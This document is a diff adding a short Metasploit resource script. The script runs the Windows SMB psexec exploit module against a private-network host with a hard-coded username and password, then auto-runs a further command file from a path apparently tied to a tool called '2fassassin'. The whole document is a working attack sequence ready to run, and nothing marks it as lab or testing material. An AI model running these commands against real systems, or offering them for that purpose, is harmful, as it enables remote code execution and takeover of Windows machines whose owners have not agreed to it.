@@ -1,0 +1,7 @@
+use exploit/windows/smb/psexec
+set rhost 172.16.173.180
+set SMBUser client
+set SMBPass password
+set EXITFUNC seh
+set AutoRunScript multi_console_command -rc /root/2fassassin/cert/transport/instruction/missy
+run
